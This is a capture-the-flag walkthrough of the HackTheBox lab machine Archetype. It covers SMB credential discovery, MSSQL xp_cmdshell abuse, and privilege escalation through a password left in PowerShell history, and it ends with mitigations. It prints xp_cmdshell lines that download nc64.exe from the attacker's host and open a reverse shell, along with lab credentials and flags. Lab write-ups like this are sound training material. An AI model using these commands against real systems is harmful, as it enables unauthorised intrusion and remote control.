# Archetype - HackTheBox Writeup

**Date:** 2026-04-14
**OS:** Windows
**IP Address:** 10.129.26.216
**Difficulty:** Very Easy
**Points:** 10

---

# 1. Executive Summary

This writeup documents the exploitation process for the HackTheBox machine **Archetype**. The attack surface involved a misconfigured SMB share which leaked SQL Server configuration files containing credentials. These credentials allowed for initial access to a Microsoft SQL Server instance, which was then abused via `xp_cmdshell` to obtain a reverse shell. Privilege escalation was accomplished by harvesting stored credentials in the PowerShell console history.

*   **Initial Access:** SMB share `backups` contained `prod.dtsConfig` with `sql_svc` credentials. MSSQL `xp_cmdshell` provided RCE.
*   **Privilege Escalation:** PowerShell history file contained credentials for the local `administrator` account.
*   **Key Learning Points:** 
    * Improperly secured SMB shares can lead to sensitive data exposure.
    * SQL Server service accounts with `sysadmin` privileges are highly dangerous.
    * PowerShell history can be a goldmine for lateral movement and privilege escalation.

---

# 2. Reconnaissance & Enumeration

## 2.1. Nmap Scan

| Port | Service | Version | Notes |
| :--- | :--- | :--- | :--- |
| 135 | msrpc | Microsoft Windows RPC | Standard RPC |
| 139 | netbios-ssn | Microsoft Windows netbios-ssn | NetBIOS |
| 445 | microsoft-ds | Windows Server 2019 Standard | SMB Share available |
| 1433 | ms-sql-s | Microsoft SQL Server 2017 | MSSQL Instance |
| 5985 | http | Microsoft HTTPAPI httpd 2.0 | WinRM |

**Nmap Command:**
```bash
nmap -p- -sC -sV -oN nmap/Archetype 10.129.26.149
```

## 2.2. SMB Enumeration
Listing shares with `smbclient` revealed a non-standard share named `backups`.

```bash
smbclient -L 10.129.26.216
```

Inside the `backups` share, a file named `prod.dtsConfig` was found.

```bash
smbclient \\\\10.129.26.216\\backups
get prod.dtsConfig
```

The file containedplaintext credentials for the `sql_svc` user:
- **User:** `ARCHETYPE\sql_svc`
- **Password:** `M3g4c0rp123`

---

# 3. Initial Access (User Flag)

## 3.1. Vulnerability Analysis
*   **Vulnerability:** Weak Service Account Configuration & Insecure Information Storage.
*   **Vector:** The `sql_svc` account had `sysadmin` privileges on the MSSQL instance, allowing the enabling of `xp_cmdshell`.

## 3.2. Exploitation Path
1.  Connected to the MSSQL instance using `mssqlclient.py`.
2.  Verified `sysadmin` privileges with `SELECT is_srvrolemember('sysadmin');`.
3.  Enabled advanced options and `xp_cmdshell`:
    ```sql
    EXEC sp_configure 'show advanced options', 1;
    RECONFIGURE;
    EXEC sp_configure 'xp_cmdshell', 1;
    RECONFIGURE;
    ```
4.  Downloaded a reverse shell binary (`nc64.exe`) and executed it.
    ```sql
    xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.240/nc64.exe -outfile nc64.exe"
    xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.240 443"
    ```

**User Flag:**
```text
3e7b102e78218e935bf3f4951fec21a3
```

---

# 4. Privilege Escalation (Root Flag)

## 4.1. Local Enumeration
Running `winPEAS` or manually checking common locations revealed a PowerShell history file:
`C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

The file contained a command used to map a drive, leaking the administrator password:
`net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!`

## 4.2. Exploitation Path
Using the discovered credentials, we gained an administrative shell via `psexec.py`.

```bash
python3 psexec.py administrator@10.129.26.216
```

**Root Flag:**
```text
b91ccec3305e98240082d4474b848528
```

---

# 5. Credentials & Loot

| Username | Password / Hash | Source |
| :--- | :--- | :--- |
| sql_svc | M3g4c0rp123 | prod.dtsConfig (SMB) |
| administrator | MEGACORP_4dm1n!! | ConsoleHost_history.txt |

---

# 6. Recommendations & Mitigation
1. **Restrict SMB Access:** Ensure that sensitive configuration files are not stored on public or guest-accessible SMB shares.
2. **MSSQL Hardening:** Follow the principle of least privilege for SQL service accounts. Disable `xp_cmdshell` unless absolutely necessary.
3. **Log Hygiene:** Clear PowerShell history and other application logs that might contain plaintext credentials. Consider disabling `PSReadLine` history on sensitive systems.


